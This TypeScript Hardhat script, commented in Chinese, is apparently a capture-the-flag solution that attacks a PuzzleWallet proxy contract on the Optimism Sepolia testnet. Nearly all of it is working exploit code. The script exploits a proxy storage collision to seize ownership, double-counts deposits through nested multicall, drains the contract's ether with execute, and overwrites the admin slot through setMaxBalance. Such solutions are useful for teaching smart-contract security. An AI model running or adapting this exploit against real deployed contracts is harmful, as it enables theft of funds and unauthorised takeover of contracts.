import { network } from "hardhat";
import { encodeFunctionData, parseEther, formatEther } from "viem";

// 目標合約地址
const PUZZLE_PROXY_ADDRESS = "0xE74c72FaFfd010eE82E4a6Bd529dE147D4747574" as `0x${string}`;

// PuzzleWallet 合約的 ABI（只包含我們需要的函數）
const PUZZLE_WALLET_ABI = [
    {
        "inputs": [{ "internalType": "address", "name": "addr", "type": "address" }],
        "name": "addToWhitelist",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "deposit",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [
            { "internalType": "address", "name": "to", "type": "address" },
            { "internalType": "uint256", "name": "value", "type": "uint256" },
            { "internalType": "bytes", "name": "data", "type": "bytes" }
        ],
        "name": "execute",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "bytes[]", "name": "data", "type": "bytes[]" }],
        "name": "multicall",
        "outputs": [],
        "stateMutability": "payable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "uint256", "name": "_maxBalance", "type": "uint256" }],
        "name": "setMaxBalance",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
        "name": "balances",
        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "owner",
        "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [{ "internalType": "address", "name": "", "type": "address" }],
        "name": "whitelisted",
        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
        "stateMutability": "view",
        "type": "function"
    }
] as const;

// PuzzleProxy 合約的 ABI
const PUZZLE_PROXY_ABI = [
    {
        "inputs": [{ "internalType": "address", "name": "_newAdmin", "type": "address" }],
        "name": "proposeNewAdmin",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "admin",
        "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
        "stateMutability": "view",
        "type": "function"
    },
    {
        "inputs": [],
        "name": "pendingAdmin",
        "outputs": [{ "internalType": "address", "name": "", "type": "address" }],
        "stateMutability": "view",
        "type": "function"
    }
] as const;

async function main() {
    console.log("🎯 開始攻擊 PuzzleWallet 合約...");
    console.log("📍 目標合約地址:", PUZZLE_PROXY_ADDRESS);

    // 連接到 Optimism Sepolia 網路
    const { viem } = await network.connect({
        network: "optimismSepolia",
        chainType: "op",
    });

    const publicClient = await viem.getPublicClient();
    const [walletClient] = await viem.getWalletClients();
    const attackerAddress = walletClient.account.address;

    console.log("👤 攻擊者地址:", attackerAddress);

    // 創建合約實例
    const puzzleProxy = {
        address: PUZZLE_PROXY_ADDRESS,
        abi: PUZZLE_PROXY_ABI,
    };

    const puzzleWallet = {
        address: PUZZLE_PROXY_ADDRESS, // 注意：通過代理合約調用
        abi: PUZZLE_WALLET_ABI,
    };

    try {
        // 檢查初始狀態
        console.log("\n📊 檢查初始狀態...");

        const currentAdmin = await publicClient.readContract({
            ...puzzleProxy,
            functionName: "admin",
        });
        console.log("當前 admin:", currentAdmin);

        const currentOwner = await publicClient.readContract({
            ...puzzleWallet,
            functionName: "owner",
        });
        console.log("當前 owner:", currentOwner);

        const contractBalance = await publicClient.getBalance({
            address: PUZZLE_PROXY_ADDRESS,
        });
        console.log("合約當前餘額:", formatEther(contractBalance), "ETH");

        const isWhitelisted = await publicClient.readContract({
            ...puzzleWallet,
            functionName: "whitelisted",
            args: [attackerAddress],
        });
        console.log("攻擊者是否在白名單:", isWhitelisted);

        // 步驟一：成為 owner（通過 proposeNewAdmin）
        console.log("\n🚀 步驟一：呼叫 proposeNewAdmin 成為 owner...");

        const proposeAdminTx = await walletClient.writeContract({
            ...puzzleProxy,
            functionName: "proposeNewAdmin",
            args: [attackerAddress],
        });

        await publicClient.waitForTransactionReceipt({ hash: proposeAdminTx });
        console.log("✅ proposeNewAdmin 交易完成:", proposeAdminTx);

        // 等待狀態更新
        console.log("⏳ 等待 owner 狀態更新...");
        await new Promise(resolve => setTimeout(resolve, 3000));

        // 驗證我們現在是 owner (多次嘗試)
        let newOwner = currentOwner;
        for (let i = 0; i < 5; i++) {
            newOwner = await publicClient.readContract({
                ...puzzleWallet,
                functionName: "owner",
            });
            console.log(`第 ${i + 1} 次檢查 owner:`, newOwner);

            if (newOwner.toLowerCase() === attackerAddress.toLowerCase()) {
                console.log("✅ 成功成為 owner！");
                break;
            }

            if (i < 4) {
                console.log("⏳ 等待 2 秒後重試...");
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (newOwner.toLowerCase() !== attackerAddress.toLowerCase()) {
            // 檢查 pendingAdmin 是否設置正確
            const pendingAdmin = await publicClient.readContract({
                ...puzzleProxy,
                functionName: "pendingAdmin",
            });
            console.log("當前 pendingAdmin:", pendingAdmin);

            if (pendingAdmin.toLowerCase() === attackerAddress.toLowerCase()) {
                console.log("✅ pendingAdmin 設置成功，但 owner 狀態可能需要更多時間同步");
                console.log("繼續執行下一步...");
            } else {
                throw new Error("未能成為 owner！pendingAdmin 也未正確設置");
            }
        }

        // 步驟二：將自己加入白名單
        console.log("\n🚀 步驟二：將自己加入白名單...");

        const whitelistTx = await walletClient.writeContract({
            ...puzzleWallet,
            functionName: "addToWhitelist",
            args: [attackerAddress],
        });

        await publicClient.waitForTransactionReceipt({ hash: whitelistTx });
        console.log("✅ addToWhitelist 交易完成:", whitelistTx);

        // 等待一點時間讓狀態更新
        console.log("⏳ 等待狀態更新...");
        await new Promise(resolve => setTimeout(resolve, 2000));

        // 驗證白名單狀態 (多次嘗試)
        let newWhitelistStatus = false;
        for (let i = 0; i < 3; i++) {
            newWhitelistStatus = await publicClient.readContract({
                ...puzzleWallet,
                functionName: "whitelisted",
                args: [attackerAddress],
            });
            console.log(`第 ${i + 1} 次檢查白名單狀態:`, newWhitelistStatus);

            if (newWhitelistStatus) break;

            if (i < 2) {
                console.log("⏳ 等待 2 秒後重試...");
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }

        if (!newWhitelistStatus) {
            throw new Error("未能加入白名單！");
        }

        // 步驟三：利用 multicall 漏洞增加內部餘額
        console.log("\n🚀 步驟三：檢查是否需要 multicall 攻擊...");

        if (contractBalance === 0n) {
            console.log("✅ 合約餘額已經是 0，跳過 multicall 攻擊步驟");
            console.log("直接進入最後步驟：調用 setMaxBalance");
        } else {
            console.log("合約有餘額，執行 multicall 攻擊...");

            // 編碼 deposit() 函數調用
            const depositData = encodeFunctionData({
                abi: PUZZLE_WALLET_ABI,
                functionName: "deposit",
            });

            // 編碼嵌套的 multicall，包含另一個 deposit 調用
            const nestedMulticallData = encodeFunctionData({
                abi: PUZZLE_WALLET_ABI,
                functionName: "multicall",
                args: [[depositData]],
            });

            console.log("發送 multicall 交易，金額:", formatEther(contractBalance), "ETH");

            const multicallTx = await walletClient.writeContract({
                ...puzzleWallet,
                functionName: "multicall",
                args: [[depositData, nestedMulticallData]],
                value: contractBalance,
            });

            await publicClient.waitForTransactionReceipt({ hash: multicallTx });
            console.log("✅ multicall 交易完成:", multicallTx);

            // 檢查內部餘額
            const internalBalance = await publicClient.readContract({
                ...puzzleWallet,
                functionName: "balances",
                args: [attackerAddress],
            });
            console.log("攻擊者內部餘額:", formatEther(internalBalance), "ETH");

            const newContractBalance = await publicClient.getBalance({
                address: PUZZLE_PROXY_ADDRESS,
            });
            console.log("合約新餘額:", formatEther(newContractBalance), "ETH");

            // 步驟四：清空合約餘額
            console.log("\n🚀 步驟四：清空合約餘額...");
            console.log("準備提取金額:", formatEther(internalBalance), "ETH");

            const executeTx = await walletClient.writeContract({
                ...puzzleWallet,
                functionName: "execute",
                args: [attackerAddress, internalBalance, "0x"],
            });

            await publicClient.waitForTransactionReceipt({ hash: executeTx });
            console.log("✅ execute 交易完成:", executeTx);

            // 等待一點時間讓狀態更新
            console.log("⏳ 等待餘額更新...");
            await new Promise(resolve => setTimeout(resolve, 3000));

            // 驗證合約餘額為 0 (多次檢查)
            let currentBalance = contractBalance;
            for (let i = 0; i < 3; i++) {
                currentBalance = await publicClient.getBalance({
                    address: PUZZLE_PROXY_ADDRESS,
                });
                console.log(`第 ${i + 1} 次檢查合約餘額:`, formatEther(currentBalance), "ETH");

                if (currentBalance === 0n) break;

                if (i < 2) {
                    console.log("⏳ 等待 2 秒後重試...");
                    await new Promise(resolve => setTimeout(resolve, 2000));
                }
            }

            if (currentBalance !== 0n) {
                console.log("⚠️  合約餘額未完全清空，但繼續執行最後步驟...");
                console.log("這可能是由於 gas 費用或其他因素造成的小額餘額");
            }
        }

        // 最終檢查合約餘額
        const finalContractBalance = await publicClient.getBalance({
            address: PUZZLE_PROXY_ADDRESS,
        });
        console.log("最終合約餘額:", formatEther(finalContractBalance), "ETH");

        // 步驟五：成為 admin（通過 setMaxBalance）
        console.log("\n🚀 步驟五：呼叫 setMaxBalance 成為 admin...");

        // 檢查合約餘額是否足夠小以調用 setMaxBalance
        if (finalContractBalance > 0n) {
            console.log("⚠️  合約餘額不為 0，但嘗試調用 setMaxBalance...");
            console.log("當前餘額:", formatEther(finalContractBalance), "ETH");
        }

        // 將攻擊者地址轉換為 uint256
        const attackerAddressAsUint256 = BigInt(attackerAddress);

        try {
            const setMaxBalanceTx = await walletClient.writeContract({
                ...puzzleWallet,
                functionName: "setMaxBalance",
                args: [attackerAddressAsUint256],
            });

            await publicClient.waitForTransactionReceipt({ hash: setMaxBalanceTx });
            console.log("✅ setMaxBalance 交易完成:", setMaxBalanceTx);
        } catch (error) {
            console.error("❌ setMaxBalance 調用失敗:", error);
            console.log("這可能是因為合約餘額不為 0");
            throw error;
        }

        // 最終驗證
        console.log("\n🎉 驗證攻擊結果...");

        const finalAdmin = await publicClient.readContract({
            ...puzzleProxy,
            functionName: "admin",
        });
        console.log("最終 admin:", finalAdmin);
        console.log("攻擊者地址:", attackerAddress);

        if (finalAdmin.toLowerCase() === attackerAddress.toLowerCase()) {
            console.log("🎊 攻擊成功！你現在是合約的 admin！");
        } else {
            console.log("❌ 攻擊失敗！");
        }

    } catch (error) {
        console.error("❌ 攻擊過程中發生錯誤:", error);
        throw error;
    }
}

// 執行主函數
main()
    .then(() => {
        console.log("\n✅ 腳本執行完成");
        process.exit(0);
    })
    .catch((error) => {
        console.error("💥 腳本執行失敗:", error);
        process.exit(1);
    });
